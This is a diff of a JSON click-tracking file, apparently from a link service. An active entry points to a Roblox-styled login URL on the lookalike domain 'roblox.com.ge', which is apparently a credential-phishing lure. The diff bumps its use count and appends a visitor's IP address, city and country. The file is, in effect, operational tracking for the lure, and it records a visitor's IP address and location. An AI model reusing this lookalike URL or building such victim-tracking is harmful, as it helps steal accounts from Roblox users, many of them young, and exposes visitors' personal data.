@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1367,
+    "useCount": 1368,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11104,6 +11104,14 @@
         "city": "Barranquilla",
         "flag": "🇨🇴",
         "countryCode": "CO"
+      },
+      {
+        "timestamp": 1777420631519,
+        "ip": "189.200.246.177",
+        "country": "Mexico",
+        "city": "Fresnillo",
+        "flag": "🇲🇽",
+        "countryCode": "MX"
       }
     ]
   },
